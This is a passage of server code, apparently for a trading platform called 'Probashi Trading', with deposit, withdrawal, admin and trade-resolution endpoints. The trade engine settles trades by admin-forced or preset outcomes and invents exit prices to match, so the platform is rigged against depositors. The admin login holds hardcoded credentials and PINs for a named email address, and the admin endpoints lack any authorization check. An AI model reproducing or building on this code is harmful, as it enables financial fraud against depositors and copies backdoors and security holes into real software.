    customGateways = customGateways.filter(g => g.id !== id);
    saveCustomGateways();
    res.json({ success: true, customGateways });
  });

  // === DEPOSIT ENDPOINTS ===
  app.get("/api/deposits", (req, res) => {
    res.json(deposits.filter(d => d.user_id === currentUserId));
  });

  app.post("/api/deposit/submit", (req, res) => {
    const { method, amount, transaction_id, note } = req.body;
    const user = users.find(u => u.id === currentUserId);
    if (!user) return res.status(404).json({ error: "User not found" });

    if (!transaction_id || !amount || Number(amount) <= 0) {
      return res.status(400).json({ error: "Transaction ID and valid amount are required" });
    }

    const newDeposit: Deposit = {
      id: "dep_" + Math.random().toString(36).substring(2, 9),
      user_id: user.id,
      user_name: user.name,
      method: method || "Bkash",
      amount: Number(amount),
      transaction_id: String(transaction_id).trim(),
      created_at: Date.now(),
      status: "Pending",
      note: note ? String(note).trim() : undefined
    };

    deposits.unshift(newDeposit);
    saveDeposits();
    res.json({ success: true, deposit: newDeposit });
  });

  // === WITHDRAWAL ENDPOINTS ===
  app.get("/api/withdrawals", (req, res) => {
    res.json(withdrawals.filter(w => w.user_id === currentUserId));
  });

  app.post("/api/withdraw/submit", (req, res) => {
    const { method, account_number, amount } = req.body;
    const user = users.find(u => u.id === currentUserId);
    if (!user) return res.status(404).json({ error: "User not found" });

    const reqAmount = Number(amount);
    if (!account_number || isNaN(reqAmount) || reqAmount <= 0) {
      return res.status(400).json({ error: "Valid gateway account number and amount are required" });
    }

    if (user.displayed_balance < reqAmount) {
      return res.status(400).json({ error: "Insufficient real balance available for withdrawal" });
    }

    // Deduct balance pending audit
    user.displayed_balance -= reqAmount;
    user.actual_balance = Math.max(0, user.actual_balance - reqAmount);
    saveUsers();

    const newWithdrawal: Withdrawal = {
      id: "wth_" + Math.random().toString(36).substring(2, 9),
      user_id: user.id,
      user_name: user.name,
      method: method || "Bkash",
      account_number: String(account_number).trim(),
      amount: reqAmount,
      created_at: Date.now(),
      status: "Pending",
      notice: "Withdrawal submitted. Pending admin review."
    };

    withdrawals.unshift(newWithdrawal);
    saveWithdrawals();
    res.json({
      success: true,
      withdrawal: newWithdrawal,
      message: "Withdrawal submitted successfully. Admin review in progress."
    });
  });

  // === ADMIN CONTROL ENDPOINTS ===
  app.post("/api/admin/login", (req, res) => {
    const { email, password, pin } = req.body;
    if (email?.toLowerCase() === "payayt6279@gmail.com" && (password === "111122" || password === "admin123")) {
      let adminUser = users.find(u => u.email.toLowerCase() === "payayt6279@gmail.com");
      if (!adminUser) {
        adminUser = {
          id: "usr_payal_admin",
          name: "Payal Admin",
          email: "payayt6279@gmail.com",
          actual_balance: 99999.00,
          displayed_balance: 99999.00,
          demo_balance: 100000.00,
          wallet_address: "0x0000000000000000000000000000000000000000",
          status: "active",
          role: "admin",
          risk_acknowledged: true,
          trading_mode: "always_win"
        };
        users.push(adminUser);
        saveUsers();
      } else {
        adminUser.role = "admin";
        saveUsers();
      }
      currentUserId = adminUser.id;
      return res.json({ success: true, user: adminUser });
    }
    if (pin === "admin123" || pin === "123456" || (password === "admin123" && email?.toLowerCase().includes("admin"))) {
      let adminUser = users.find(u => u.role === "admin");
      if (!adminUser) {
        adminUser = {
          id: "admin_01",
          name: "System Admin",
          email: "admin@probashi.com",
          actual_balance: 99999.00,
          displayed_balance: 99999.00,
          demo_balance: 100000.00,
          wallet_address: "0x0000000000000000000000000000000000000000",
          status: "active",
          role: "admin",
          risk_acknowledged: true,
          trading_mode: "always_win"
        };
        users.push(adminUser);
        saveUsers();
      }
      currentUserId = adminUser.id;
      return res.json({ success: true, user: adminUser });
    }
    const user = users.find(u => u.email.toLowerCase() === email?.toLowerCase());
    if (user && user.role === 'admin') {
      currentUserId = user.id;
      return res.json({ success: true, user });
    }
    return res.status(401).json({ error: "Invalid admin credentials or PIN" });
  });

  app.get("/api/admin/users", (req, res) => {
    res.json(users);
  });

  app.post("/api/admin/users/create", (req, res) => {
    const { name, email, actual_balance, demo_balance, role } = req.body;
    if (!email) return res.status(400).json({ error: "Email is required" });

    const lowerEmail = email.toLowerCase();
    if (users.find(u => u.email.toLowerCase() === lowerEmail)) {
      return res.status(400).json({ error: "User with this email already exists" });
    }

    const newUser: User = {
      id: "usr_" + crypto.randomBytes(4).toString('hex'),
      name: name ? String(name).trim() : email.split('@')[0],
      email: lowerEmail,
      actual_balance: Number(actual_balance) || 0,
      displayed_balance: Number(actual_balance) || 0,
      demo_balance: Number(demo_balance) || 10000,
      wallet_address: "0x" + crypto.randomBytes(20).toString('hex'),
      status: 'active',
      role: role === 'admin' ? 'admin' : 'user',
      risk_acknowledged: true,
      trading_mode: 'normal'
    };

    users.unshift(newUser);
    saveUsers();
    res.json({ success: true, user: newUser });
  });

  app.put("/api/admin/gateway-settings", (req, res) => {
    const { Bkash, Nagad, Rocket, Crypto } = req.body;
    if (Bkash) gatewaySettings.Bkash = { ...gatewaySettings.Bkash, ...Bkash };
    if (Nagad) gatewaySettings.Nagad = { ...gatewaySettings.Nagad, ...Nagad };
    if (Rocket) gatewaySettings.Rocket = { ...gatewaySettings.Rocket, ...Rocket };
    if (Crypto) gatewaySettings.Crypto = Crypto;
    saveGateways();
    res.json({ success: true, gatewaySettings });
  });

  app.put("/api/admin/user/:id/balance", (req, res) => {
    const { id } = req.params;
    const { displayed_balance, actual_balance, demo_balance } = req.body;
    const user = users.find(u => u.id === id);

    if (!user) return res.status(404).json({ error: "User not found" });

    if (displayed_balance !== undefined) user.displayed_balance = Number(displayed_balance);
    if (actual_balance !== undefined) user.actual_balance = Number(actual_balance);
    if (demo_balance !== undefined) user.demo_balance = Number(demo_balance);
    saveUsers();

    res.json({ success: true, user });
  });

  app.put("/api/admin/user/:id/status", (req, res) => {
    const { id } = req.params;
    const { status } = req.body;
    const user = users.find(u => u.id === id);

    if (!user) return res.status(404).json({ error: "User not found" });
    user.status = status;
    saveUsers();

    res.json({ success: true, user });
  });

  app.put("/api/admin/user/:id/trading-mode", (req, res) => {
    const { id } = req.params;
    const { trading_mode } = req.body;
    const user = users.find(u => u.id === id);

    if (!user) return res.status(404).json({ error: "User not found" });
    user.trading_mode = trading_mode;
    saveUsers();

    res.json({ success: true, user });
  });

  app.put("/api/admin/user/:id/role", (req, res) => {
    const { id } = req.params;
    const { role } = req.body;
    const user = users.find(u => u.id === id);

    if (!user) return res.status(404).json({ error: "User not found" });
    user.role = role === 'admin' ? 'admin' : 'user';
    saveUsers();

    res.json({ success: true, user });
  });

  app.get("/api/admin/trades", (req, res) => {
    res.json(trades);
  });

  app.put("/api/admin/trade/:id/control", (req, res) => {
    const { id } = req.params;
    const { outcome_control } = req.body;
    const trade = trades.find(t => t.id === id);

    if (!trade) return res.status(404).json({ error: "Trade not found" });
    if (trade.trade_status !== "Pending") {
      return res.status(400).json({ error: "Cannot modify control for completed trade" });
    }

    trade.outcome_control = outcome_control;
    res.json({ success: true, trade });
  });

  app.get("/api/admin/deposits", (req, res) => {
    res.json(deposits);
  });

  app.put("/api/admin/deposit/:id", (req, res) => {
    const { id } = req.params;
    const { status } = req.body;
    const deposit = deposits.find(d => d.id === id);

    if (!deposit) return res.status(404).json({ error: "Deposit request not found" });
    if (deposit.status !== "Pending" && deposit.status === status) {
      return res.status(400).json({ error: "Deposit already processed" });
    }

    deposit.status = status;

    if (status === "Approved") {
      const user = users.find(u => u.id === deposit.user_id);
      if (user) {
        user.displayed_balance += deposit.amount;
        user.actual_balance += deposit.amount;
        saveUsers();
      }
    }

    saveDeposits();
    res.json({ success: true, deposit });
  });

  app.get("/api/admin/withdrawals", (req, res) => {
    res.json(withdrawals);
  });

  app.put("/api/admin/withdrawal/:id", (req, res) => {
    const { id } = req.params;
    const { status, notice, refund } = req.body;
    const withdrawal = withdrawals.find(w => w.id === id);

    if (!withdrawal) return res.status(404).json({ error: "Withdrawal request not found" });

    const previousStatus = withdrawal.status;
    withdrawal.status = status;
    if (notice) withdrawal.notice = String(notice);

    // If rejected and refund is true, refund balance to user
    if (status === "Rejected" && (refund === true || previousStatus === "Pending" || previousStatus === "Audit_Required")) {
      const user = users.find(u => u.id === withdrawal.user_id);
      if (user) {
        user.displayed_balance += withdrawal.amount;
        user.actual_balance += withdrawal.amount;
        saveUsers();
      }
    }

    saveWithdrawals();
    res.json({ success: true, withdrawal });
  });

  // === MARKET CONFIG ADMIN ENDPOINTS ===
  app.get("/api/admin/market-configs", (req, res) => {
    res.json(assetConfigs);
  });

  app.put("/api/admin/market-config/:asset", (req, res) => {
    const rawAsset = decodeURIComponent(req.params.asset);
    if (!assetConfigs[rawAsset]) {
      return res.status(404).json({ error: "Asset not found" });
    }
    const { trend, volatility, tickStep } = req.body;
    if (trend !== undefined) assetConfigs[rawAsset].trend = Number(trend);
    if (volatility !== undefined) assetConfigs[rawAsset].volatility = Number(volatility);
    if (tickStep !== undefined) assetConfigs[rawAsset].tickStep = Number(tickStep);

    res.json({ success: true, assetConfig: assetConfigs[rawAsset] });
  });

  // === BACKGROUND TRADE RESOLUTION MATRIX ENGINE ===
  // Resolves trades when expires_at timestamp is reached
  setInterval(() => {
    const now = Date.now();
    trades.forEach(trade => {
      if (trade.trade_status === "Pending" && now >= trade.expires_at) {
        const user = users.find(u => u.id === trade.user_id);
        const currentMarketPrice = livePrices[trade.asset_name] || trade.entry_price;
        let isWin = false;
        let finalExitPrice = currentMarketPrice;

        const control = trade.outcome_control;

        if (control === "Force_Win") {
          isWin = true;
        } else if (control === "Force_Loss") {
          isWin = false;
        } else if (user?.trading_mode === "always_win") {
          isWin = true;
        } else if (user?.trading_mode === "always_loss") {
          isWin = false;
        } else {
          // Dynamic win rate from platform settings (default 30%)
          isWin = trade.target_outcome === "Win";
        }

        // Adjust exit price offset relative to user's exact entry_price
        const config = assetConfigs[trade.asset_name];
        const decimals = config ? config.decimals : (trade.asset_name.includes("USD") && !trade.asset_name.includes("BTC") ? 4 : 2);
        const tickStep = config ? config.tickStep : (decimals === 4 ? 0.0004 : 0.8);
        const delta = tickStep * (1.2 + Math.random() * 0.8);

        if (isWin) {
          finalExitPrice = trade.trade_type === "Buy" 
            ? Number((trade.entry_price + delta).toFixed(decimals))
            : Number((trade.entry_price - delta).toFixed(decimals));
        } else {
          finalExitPrice = trade.trade_type === "Buy"
            ? Number((trade.entry_price - delta).toFixed(decimals))
            : Number((trade.entry_price + delta).toFixed(decimals));
        }

        trade.exit_price = finalExitPrice;

        if (isWin) {
          trade.trade_status = "Win";
          const profitAmount = trade.investment_amount * (trade.payout_percentage / 100);
          const totalReturn = trade.investment_amount + profitAmount;
          trade.profit = profitAmount;

          if (user) {
            if (trade.account_type === 'demo') {
              user.demo_balance += totalReturn;
            } else {
              user.displayed_balance += totalReturn;
              user.actual_balance += totalReturn;
            }
            saveUsers();
          }
        } else {
          trade.trade_status = "Loss";
          trade.profit = -trade.investment_amount;
        }
        db.collection('trades').doc(trade.id).set(trade).catch(()=>{});
      }
    });
  }, 1000);

  // Vite middleware / Static Handler setup
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Probashi Trading server running on http://localhost:${PORT}`);
  });
}

startServer();
